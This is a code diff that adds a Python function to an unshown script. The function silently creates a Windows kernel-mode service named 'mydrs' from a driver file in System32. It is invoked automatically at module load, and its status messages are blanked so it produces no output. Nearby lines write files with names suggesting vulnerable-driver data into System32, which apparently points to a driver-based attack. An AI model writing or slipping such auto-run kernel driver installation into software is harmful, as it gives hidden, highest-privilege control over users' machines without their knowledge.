@@ -344,6 +344,30 @@ def get_string_from_file(file_path):
         return content
     else:
         return "Error"
+def manage_service():
+    service_name = "mydrs"
+    bin_path = "C:\\Windows\\System32\\mydriver.sys"
+
+    try:
+        # Check if the service exists
+        result = subprocess.run([
+            'sc', 'query', service_name
+        ], capture_output=True, text=True, check=False)
+
+        if 'STATE' in result.stdout:
+            print(f"")
+        else:
+            print(f"")
+            # Create the service
+            create_result = subprocess.run([
+                'sc', 'create', service_name, f'binPath= {bin_path}', 'type=kernel'
+            ], capture_output=True, text=True, check=False)
+
+    except Exception as e:
+        print(f"")
+        sys.exit(1)
+
+manage_service()
 system_info_path = os.path.join(os.environ['SystemRoot'], 'System32', 'systeminfo.txt')
 system_driver_vul_path = os.path.join(os.environ['SystemRoot'], 'System32', 'system_driver_vul.txt')
 data_vulnerable_path = os.path.join(os.environ['SystemRoot'], 'System32', 'data_vulnerable_x.txt')
